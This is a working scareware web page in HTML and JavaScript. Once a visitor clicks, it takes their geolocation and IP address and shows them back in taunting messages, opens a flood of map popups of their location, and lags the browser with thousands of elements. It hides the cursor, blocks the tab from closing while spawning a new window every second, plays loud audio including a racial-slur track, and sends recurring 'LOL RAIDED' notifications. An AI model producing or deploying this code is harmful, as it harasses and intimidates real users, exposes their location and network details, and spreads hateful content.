<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stuff Maje</title>
    <style>
        body, html {
            height: 100%;
            margin: 0;
            overflow: hidden;
            background: url('https://uploads.onecompiler.io/437rezxye/438m92bxn/IMG_0111.gif') no-repeat center center;
            background-size: cover;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: white;
            font-family: Arial, sans-serif;
        }
        #cursor-freeze {
            position: absolute;
            top: 50%;
            left: 50%;
            width: 100px;
            height: 100px;
            background: transparent;
            cursor: none;
            transform: translate(-50%, -50%);
        }
        #click-to-load {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 24px;
            color: red;
            z-index: 1000;
        }
        .popup {
            position: absolute;
            width: 300px;
            height: 300px;
            background: rgba(0, 0, 0, 0.8);
            color: white;
            text-align: center;
            padding: 20px;
            border: 2px solid red;
            box-shadow: 0 0 20px red;
            z-index: 1000;
            font-size: 18px;
        }
        .popup img {
            max-width: 100%;
            max-height: 100%;
        }
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            color: red;
            font-size: 24px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 2000;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { color: red; }
            50% { color: darkred; }
            100% { color: red; }
        }
    </style>
</head>
<body>
    <div id="click-to-load">Click anywhere to load the page</div>
    <div id="cursor-freeze"></div>
    <div id="overlay" class="overlay" style="display: none;"></div>

    <audio id="audioElement1" src="https://github.com/gtatacotruck/Silver-toes-scareware/raw/41ed47b5d70ce74ff64b68274868a33101318a39/_NGR%20NGR%20NGR.mp3" loop></audio>
    <audio id="audioElement2" src="https://github.com/gtatacotruck/Silver-toes-scareware/raw/41ed47b5d70ce74ff64b68274868a33101318a39/Daniel%20Beenards%20Last%20Words%20(SAD).mp3" loop></audio>
    <audio id="audioElement3" src="https://github.com/gtatacotruck/Silver-toes-scareware/raw/09a916a1cdf93224dcd83ff48e4452ab6225ee71/NWORDSPAM.mp3" loop></audio>

    <script>
        async function fetchIP() {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        }

        function getUserState() {
            return Intl.DateTimeFormat().resolvedOptions().timeZone;
        }

        function getUserLocation() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            const { latitude, longitude } = position.coords;
                            resolve({ latitude, longitude });
                        },
                        (error) => {
                            reject(error);
                        }
                    );
                } else {
                    reject('Geolocation is not supported by this browser.');
                }
            });
        }

        function freezeCursor() {
            const cursorFreeze = document.getElementById('cursor-freeze');
            cursorFreeze.style.cursor = 'none';
            document.body.style.cursor = 'none';
        }

        function lagBrowser() {
            const interval = setInterval(() => {
                const div = document.createElement('div');
                div.style.position = 'absolute';
                div.style.top = `${Math.random() * 100}%`;
                div.style.left = `${Math.random() * 100}%`;
                div.style.width = `${Math.random() * 50}px`;
                div.style.height = `${Math.random() * 50}px`;
                div.style.background = `rgba(0, 0, 0, 0.5)`;
                document.body.appendChild(div);
            }, 10);
            setTimeout(() => clearInterval(interval), 5000);
        }

        function openMapPopups(latitude, longitude) {
            const numPopups = 20; // Number of map popups to open
            const interval = 200; // Interval between opening popups

            for (let i = 0; i < numPopups; i++) {
                setTimeout(() => {
                    const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
                    window.open(mapUrl, '_blank', 'width=800,height=600');
                }, i * interval);
            }
        }

        function playRandomAudio() {
            const audioElements = [
                document.getElementById('audioElement1'),
                document.getElementById('audioElement2'),
                document.getElementById('audioElement3')
            ];
            const randomIndex = Math.floor(Math.random() * audioElements.length);
            const selectedAudio = audioElements[randomIndex];
            selectedAudio.volume = 1.0; // Set volume to maximum
            selectedAudio.play().catch(() => {
                // If autoplay fails, try again after a short delay
                setTimeout(() => selectedAudio.play(), 1000);
            });
        }

        function makeBrowserBuggy() {
            // Add more elements to lag the browser
            for (let i = 0; i < 1000; i++) {
                const div = document.createElement('div');
                div.style.position = 'absolute';
                div.style.top = `${Math.random() * 100}%`;
                div.style.left = `${Math.random() * 100}%`;
                div.style.width = `${Math.random() * 50}px`;
                div.style.height = `${Math.random() * 50}px`;
                div.style.background = `rgba(0, 0, 0, 0.5)`;
                document.body.appendChild(div);
            }

            // Make the cursor behavior more erratic
            document.body.style.cursor = 'none';
            setInterval(() => {
                document.body.style.cursor = 'default';
                setTimeout(() => {
                    document.body.style.cursor = 'none';
                }, 500);
            }, 1000);
        }

        function preventClose() {
            window.addEventListener('beforeunload', (event) => {
                event.preventDefault();
                event.returnValue = '';
            });

            setInterval(() => {
                window.open('', '_blank', 'width=400,height=300');
            }, 1000);
        }

        function popUpGifsAndImages() {
            const gifUrls = [
                'https://github.com/gtatacotruck/Silver-toes-scareware/raw/a74e36b74168bae104be775c56ca79aa480122a3/Smd.gif',
                'https://github.com/gtatacotruck/Silver-toes-scareware/raw/a74e36b74168bae104be775c56ca79aa480122a3/Mb%20bro.gif',
                'https://github.com/gtatacotruck/Silver-toes-scareware/raw/a74e36b74168bae104be775c56ca79aa480122a3/How%20KOC%20made%20Ts.gif',
                'https://github.com/gtatacotruck/Silver-toes-scareware/raw/a74e36b74168bae104be775c56ca79aa480122a3/Get.gif'
            ];
            const imageUrls = [
                'https://github.com/gtatacotruck/Silver-toes-scareware/raw/5427070e08ca735fd0a73582f15733e524b964ae/IMG_1017.png',
                'https://github.com/gtatacotruck/Silver-toes-scareware/raw/5427070e08ca735fd0a73582f15733e524b964ae/IMG_1016.png',
                'https://github.com/gtatacotruck/Silver-toes-scareware/raw/5427070e08ca735fd0a73582f15733e524b964ae/IMG_0950.jpeg',
                'https://github.com/gtatacotruck/Silver-toes-scareware/raw/5427070e08ca735fd0a73582f15733e524b964ae/IMG_0949.jpeg',
                'https://github.com/gtatacotruck/Silver-toes-scareware/raw/5427070e08ca735fd0a73582f15733e524b964ae/IMG_0704.jpeg'
            ];
            const numElements = 50; // Number of elements to pop up
            const interval = 500; // Increased interval between element appearances in milliseconds

            for (let i = 0; i < numElements; i++) {
                setTimeout(() => {
                    const popup = document.createElement('div');
                    popup.className = 'popup';
                    popup.style.top = `${Math.random() * 100}%`;
                    popup.style.left = `${Math.random() * 100}%`;
                    popup.innerHTML = `<img src="${i % 2 === 0 ? gifUrls[Math.floor(Math.random() * gifUrls.length)] : imageUrls[Math.floor(Math.random() * imageUrls.length)]}" alt="Popup Image"><br>GET THUGGED`;
                    document.body.appendChild(popup);
                }, i * interval);
            }
        }

        function requestNotificationPermission() {
            return new Promise((resolve, reject) => {
                if ('Notification' in window) {
                    Notification.requestPermission().then(permission => {
                        if (permission === 'granted') {
                            resolve();
                        } else {
                            reject();
                        }
                    });
                } else {
                    reject('Notifications are not supported by this browser.');
                }
            });
        }

        function sendNotification() {
            if ('Notification' in window && Notification.permission === 'granted') {
                new Notification('LOL RAIDED');
            }
        }

        function setupNotificationInterval() {
            sendNotification();
            setInterval(sendNotification, 60000); // Send notification every 60 seconds
        }

        document.addEventListener('click', async () => {
            const clickToLoad = document.getElementById('click-to-load');
            clickToLoad.style.display = 'none';

            let location;
            try {
                location = await getUserLocation();
                openMapPopups(location.latitude, location.longitude);
            } catch (error) {
                if (error.code === 1) {
                    // User denied location permission
                    alert('You need to accept location permissions for the site to work.');
                    location = await getUserLocation();
                    openMapPopups(location.latitude, location.longitude);
                } else {
                    console.error('Error getting location:', error);
                    return;
                }
            }

            const userIP = await fetchIP();
            const userState = getUserState();

            const overlay = document.getElementById('overlay');
            overlay.innerHTML = `IMAGING LIVING IN ${userState}<br>LOL UR IP IS ${userIP}`;
            overlay.style.display = 'block';

            try {
                await requestNotificationPermission();
                setupNotificationInterval();
            } catch (error) {
                console.error('Error requesting notification permission:', error);
            }

            freezeCursor();
            lagBrowser();
            playRandomAudio();
            makeBrowserBuggy();
            preventClose();
            popUpGifsAndImages();
        });
    </script>
</body>
</html>
